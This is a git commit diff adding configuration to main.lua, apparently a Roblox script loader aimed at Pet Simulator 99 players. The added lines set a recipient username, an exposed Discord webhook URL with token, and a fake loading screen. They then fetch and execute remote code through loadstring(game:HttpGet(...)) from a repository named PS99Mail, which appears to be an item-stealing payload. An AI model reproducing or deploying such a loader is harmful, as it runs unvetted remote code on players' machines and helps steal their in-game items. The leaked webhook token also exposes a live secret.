13beecf333c92865daf68440b6cd18455f01a0e8
RuebanD <120219002+RuebanD@users.noreply.github.com>
2024-01-28 23:05:51 +0000

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,6 @@
+Username = "BIGBOYRUEB"
+Webhook = "https://discordapp.com/api/webhooks/1201301712808443944/r8MDMQN_p3QXIot93GlBJQ27xoyyVKbujIiV6X36IrMuPnFTKBm0EoDsHVr1Q1fInIDV"
+selectedLoadingScreen = "Select Loading" -- Select Loading Screen And Write Number If You Not Select Loading Screen its automaticly select loading screen 1
+LoadingScreen = true
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/PS99Mail/main/Mementomori"))()
